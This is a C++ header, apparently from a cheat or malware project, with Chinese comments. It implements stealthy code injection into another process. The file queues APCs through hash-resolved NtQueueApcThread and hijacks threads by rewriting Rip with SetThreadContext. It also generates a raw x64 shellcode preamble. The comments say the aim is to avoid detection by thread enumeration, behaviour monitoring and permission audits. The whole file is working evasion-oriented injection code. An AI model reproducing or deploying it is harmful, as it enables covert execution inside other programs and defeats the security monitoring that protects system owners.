// stealth/inject.hpp —— 无新线程的代码执行（P3）
//
// 传统 CreateRemoteThread 是最好抓的注入方式：新线程 + 线程起始地址落在
// 未映射区域，任何一份线程枚举都能看出问题。这里提供三级替代方案，
// 按隐蔽性从高到低：
//
//   A. 线程劫持 + 恢复（SetThreadContext）
//      找到一个正在 WaitForSingleObject/NtWaitForSingleObject 的线程，
//      把它的 Rip 改到我们的 stub，stub 结束时恢复原 Rip 与全部上下文。
//      不留新线程，不留新栈帧（复用原栈）。
//      代价：需要 SuspendThread/GetThreadContext/SetThreadContext + ResumeThread。
//
//   B. 排队 APC（QueueUserAPC / NtQueueApcThread）
//      向可报警状态（alertable wait）的线程排队 APC。
//      不留新线程；但 APC 队列本身可被 NtQueryInformationThread 观察到。
//      依赖目标线程进入 alertable wait，需要轮询等待。
//
//   C. 线程池工作项（NtQueueApcThread 的变体 / RtlQueueWorkItem）
//      Windows 线程池是系统组件，执行上下文"看起来正常"。
//      但工作项来源可被追踪。
//
// 本项目默认 B（APC），因为：
//   * 不需要挂起线程（挂起本身就是强烈的行为信号）
//   * 目标的主循环线程长期处于 alertable wait（消息泵 + 等待）
//   * 实现比 A 简单，出错面小
//
// 所有路径都需要：能 OpenThread（THREAD_SET_CONTEXT 或 THREAD_SET_INFORMATION）。
// 这本身是可被审计的权限，所以只在需要执行时短时持有，用完立刻关。
#pragma once

#include <windows.h>
#include <winternl.h>

#include <cstdint>
#include <vector>

#include "common/hash.hpp"
#include "os/process.hpp"
#include "os/scan.hpp"
#include "stealth/api.hpp"

namespace inject {

// ---------- 线程枚举 ----------
struct ThreadInfo {
    DWORD tid = 0;
    DWORD ownerPid = 0;
};

inline std::vector<ThreadInfo> threads_of(DWORD pid) {
    std::vector<ThreadInfo> out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) out.push_back({te.th32ThreadID, te.th32OwnerProcessID});
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return out;
}

using NtOpenThreadFn  = LONG(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
using NtQueueApcFn    = LONG(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, ULONG);

inline NtOpenThreadFn nt_open_thread() noexcept {
    static auto fn = api::get<NtOpenThreadFn>(api::mod::ntdll, hash::ascii("NtOpenThread"));
    return fn;
}
inline NtQueueApcFn nt_queue_apc() noexcept {
    static auto fn = api::get<NtQueueApcFn>(api::mod::ntdll, hash::ascii("NtQueueApcThread"));
    return fn;
}

// 线程句柄：作用域内自动关。权限只申请需要的位。
class ThreadHandle {
public:
    ThreadHandle() = default;
    ~ThreadHandle() { close(); }
    ThreadHandle(const ThreadHandle&) = delete;
    ThreadHandle& operator=(const ThreadHandle&) = delete;

    bool open(DWORD tid, ACCESS_MASK mask) {
        const auto openFn = nt_open_thread();
        if (!openFn || tid == 0) return false;

        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(oa);
        CLIENT_ID cid{};
        cid.UniqueProcess = nullptr;
        cid.UniqueThread = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(tid));

        HANDLE h = nullptr;
        if (openFn(&h, mask, &oa, &cid) < 0 || !h) return false;
        h_ = h;
        return true;
    }

    void close() noexcept {
        if (!h_) return;
        using Fn = LONG(NTAPI*)(HANDLE);
        static Fn ntClose = api::get<Fn>(api::mod::ntdll, hash::ascii("NtClose"));
        if (ntClose) ntClose(h_);
        else CloseHandle(h_);
        h_ = nullptr;
    }

    HANDLE get() const noexcept { return h_; }
    bool valid() const noexcept { return h_ != nullptr; }

private:
    HANDLE h_ = nullptr;
};

// ---------- B：APC 注入 ----------
// 参数：stub 地址、参数块远端地址、目标 tid
// 返回 0 成功
inline int queue_apc(DWORD tid, uint64_t stubAddr, uint64_t paramAddr) {
    ThreadHandle th;
    // THREAD_SET_CONTEXT = 0x0010，排队 APC 需要这个权限
    if (!th.open(tid, 0x0010 | 0x0008 /*THREAD_QUERY_INFORMATION*/)) return -1;

    const auto fn = nt_queue_apc();
    if (!fn) return -2;

    // NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, 2, 3)
    // x64 下 APC 例程签名：void NTAPI(PVOID Arg1, PVOID Arg2, PVOID Arg3)
    // 我们只用 Arg1 传参数块地址
    const LONG st = fn(th.get(), reinterpret_cast<PVOID>(stubAddr),
                       reinterpret_cast<PVOID>(paramAddr), nullptr, 0);
    return st >= 0 ? 0 : -3;
}

// ---------- A：线程劫持 ----------
// 找到能挂起的线程，改 Rip 到 stub，stub 结尾跳回原 Rip。
// 需要一段 preamble：pushfq + push 所有易失寄存器 + mov rcx, param + call stub
// 这里给出 preamble 生成器；调用方负责在远端分配可执行页写入它。
inline std::vector<uint8_t> make_hijack_preamble(uint64_t stubAddr, uint64_t paramAddr,
                                                uint64_t resumeAddr) {
    std::vector<uint8_t> code;

    // pushfq; push rax rcx rdx r8 r9 r10 r11
    const uint8_t save[] = {0x9C,
                            0x50,                          // push rax
                            0x51,                          // push rcx
                            0x52,                          // push rdx
                            0x41, 0x50,                    // push r8
                            0x41, 0x51,                    // push r9
                            0x41, 0x52,                    // push r10
                            0x41, 0x53};                   // push r11
    code.insert(code.end(), std::begin(save), std::end(save));

    // sub rsp, 0x28（影子空间 + 对齐）
    const uint8_t subRsp[] = {0x48, 0x83, 0xEC, 0x28};
    code.insert(code.end(), std::begin(subRsp), std::end(subRsp));

    // mov rcx, paramAddr
    code.push_back(0x48); code.push_back(0xB9);
    for (int i = 0; i < 8; ++i) code.push_back(static_cast<uint8_t>((paramAddr >> (8 * i)) & 0xFF));

    // mov rax, stubAddr; call rax
    code.push_back(0x48); code.push_back(0xB8);
    for (int i = 0; i < 8; ++i) code.push_back(static_cast<uint8_t>((stubAddr >> (8 * i)) & 0xFF));
    code.push_back(0xFF); code.push_back(0xD0);

    // add rsp, 0x28
    const uint8_t addRsp[] = {0x48, 0x83, 0xC4, 0x28};
    code.insert(code.end(), std::begin(addRsp), std::end(addRsp));

    // pop r11 r10 r9 r8 rdx rcx rax; popfq
    const uint8_t restore[] = {0x41, 0x5B,
                               0x41, 0x5A,
                               0x41, 0x59,
                               0x41, 0x58,
                               0x5A,
                               0x59,
                               0x58,
                               0x9D};
    code.insert(code.end(), std::begin(restore), std::end(restore));

    // jmp resumeAddr
    code.push_back(0x48); code.push_back(0xB8);
    for (int i = 0; i < 8; ++i) code.push_back(static_cast<uint8_t>((resumeAddr >> (8 * i)) & 0xFF));
    code.push_back(0xFF); code.push_back(0xE0);

    return code;
}

// 劫持执行：挂起 → 取上下文 → 改 Rip → 设上下文 → 恢复
// 调用方必须在远端先写好 preamble，且知道 thread 的当前 Rip 以便恢复。
// 这里只做"改 Rip 到 preamble"这一件事，因为真正执行完 recovery 需要
// preamble 里的 jmp 指回原 Rip —— 原 Rip 由 resumeAddr 传入。
inline bool hijack(DWORD tid, uint64_t preambleAddr, uint64_t* savedRip) {
    ThreadHandle th;
    // THREAD_SUSPEND_RESUME|GET_CONTEXT|SET_CONTEXT = 0x0002|0x0008|0x0010
    if (!th.open(tid, 0x0002 | 0x0008 | 0x0010)) return false;

    if (SuspendThread(th.get()) == static_cast<DWORD>(-1)) return false;

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(th.get(), &ctx)) {
        ResumeThread(th.get());
        return false;
    }

    if (savedRip) *savedRip = ctx.Rip;
    ctx.Rip = preambleAddr;

    const BOOL set = SetThreadContext(th.get(), &ctx);
    ResumeThread(th.get());
    return set != FALSE;
}

}  // namespace inject
